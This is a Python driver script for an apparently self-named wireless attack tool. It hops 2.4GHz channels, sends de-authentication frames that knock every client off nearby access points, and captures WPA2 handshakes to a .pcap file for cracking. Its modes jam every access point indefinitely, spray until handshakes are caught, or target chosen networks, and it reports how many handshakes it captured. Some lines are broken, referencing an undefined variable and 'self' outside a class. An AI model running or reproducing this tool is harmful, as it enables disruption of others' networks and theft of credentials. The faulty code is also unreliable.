#!/bin/python3
import threading
import logging
import os
import sys
import argparse
import WiFiJammer
def checkRoot():
	if os.geteuid() == 0:
		return True
	else:
		return False

def parseArguments():
	parser = argparse.ArgumentParser(description='A program that hops 2.4GHz channels to detect beacon frames and de-authorises all wirelessly connected hosts on the AP; Authentication frames may also be captured and saved to a .pcap file specified')
	ignoring = parser.add_mutually_exclusive_group()
	verbosity = parser.add_mutually_exclusive_group()
	attacks = parser.add_mutually_exclusive_group()

	parser.add_argument('int', action='store', help='Sets the interface to use for sending and/or receiving')
	parser.add_argument('recvInt', nargs='?', action='store', help='Sets a secondary interface to use; int1 sends, int2 receives', default=None)

	ignoring.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs given by command line input (by ESSID or BSSID, separated by spaces)')
	ignoring.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs from this file (by ESSID or BSSID, separated by newlines)')

	attacks.add_argument('-j', '--jammer', dest='jammer', action='store_const', const='jammer', help='Jam every AP detected indefinitely and capture handshakes')
	attacks.add_argument('-t', '--target', dest='target', action='store', type=list, help='Target one or more APs (by ESSID or BSSID)')
	attacks.add_argument('-s', '--spray', dest='spray', action='store_const', const='spray', help='Target every discovered AP until a handshake is captured')
	attacks.add_argument('-u', '--unarmed', dest='unarmed', action='store_const', const='unarmed', help='Do not send any de-auth frames')
		
	verbosity.add_argument('-vv', '--very-verbose', dest='verbosity', action='store_const', const=logging.DEBUG, help='Set program to log debug information')
	verbosity.add_argument('-v', '--verbose', dest='verbosity', action='store_const', const=logging.INFO, help='Set program to log normal functioning')

	parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')
	parser.add_argument('-c', '--channel', dest='channels', action='store', type=list, help='Channels to hop on (default is 1-11)', default=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])
	parser.add_argument('-w', '--wait-on-channel', dest='sleepOnChannel', action='store', type=int, help='Time to stay on each channel for when hopping', default=2)

	return parser.parse_args()

def makeJammerInstance(args):
	# Set list of APs to ignore
	ignoredAPs = []

	if args.list != None:
		ignoredAPs += args.list
		logging.debug('Running with Ignore AP list from command line = ' + str(ignore_AP))
	elif args.file != None:
		with open(args.file, 'r') as file:
			ignoredAPs += file.readlines()
			logging.debug('Running with Ignore AP list from file = ' + str(ignore_AP))

	# Set attack mode
	attackMode = ''
	targets = []

	if args.target:
		attackMode = 'target'
		targets = self.args.target
	elif args.spray:
		attackMode = 'spray'
	elif args.unarmed:
		attackMode = 'unarmed'
	elif args.jammer:
		attackMode = 'jammer'

	# Set appropriate sending and receiving interfaces
	int1 = args.int

	if not args.recvInt:
		int2 = args.int
	else:
		int2 = args.recvInt

	# Create Jammer instance to share
	return WiFiJammer.Jammer(ignoredAPs, attackMode, int1, int2, args.output, args.channels, targets, args.sleepOnChannel)

def statDump(jammer):
	statistics = {}
	wapsDiscovered = 0
	handshakesFound = 0
	for AccessPoint in jammer.discoveredAPs:
		wapsDiscovered += 1
		# if a dict entry exists, append to it's corresponding list, else create it
		if AccessPoint.channel in statistics:
			statistics[AccessPoint.channel].append(AccessPoint)
		else:
			statistics[AccessPoint.channel] = [AccessPoint]
	for channel in statistics:
		for AccessPoint in statistics[channel]:
			if AccessPoint.bssid in jammer.handshakesFound:
				handshakesFound += 1
				log_str = '<Handshake Found>\t\t'		
			else:
				log_str = '<Handshake Not Found>\t'
			log_str += 'ESSID: ' + AccessPoint.essid + '\t\tCH: ' + str(AccessPoint.channel)
			print(log_str)
	print('\tWireless Access Points Discovered:\t' + str(wapsDiscovered))
	print('\tWPA2 Handshakes Captured:\t\t' + str(handshakesFound))

class CricketThreads(threading.Thread):
	def __init__(self, jammerInstance, *args, **kwargs):
		super(CricketThreads, self).__init__(*args, **kwargs)
		self.jammerInstance = jammerInstance

	def run(self):
		if self.name == 'attackThread':
			self.jammerInstance.launchAttack()

		elif self.name == 'sniffThread':
			self.jammerInstance.sniffPackets()

		elif self.name == 'channelHopThread':
			self.jammerInstance.channelHop()

def main():
	if checkRoot() == False:
		print("Please run this script as root/sudo")
		quit()
	args = parseArguments()
	logging.basicConfig(stream=sys.stdout, format='\t%(message)s',level=args.verbosity)
	jammer = makeJammerInstance(args)

	threads = [
		CricketThreads(jammerInstance=jammer, name='attackThread'),
		CricketThreads(jammerInstance=jammer, name='sniffThread'),
		CricketThreads(jammerInstance=jammer, name='channelHopThread')
	]

	for t in threads:
		t.start()
	try:
		while True:
			None
	except KeyboardInterrupt:
		jammer.halt()
		for t in threads:
			t.join()
		statDump(jammer)

if __name__ == '__main__':
    main()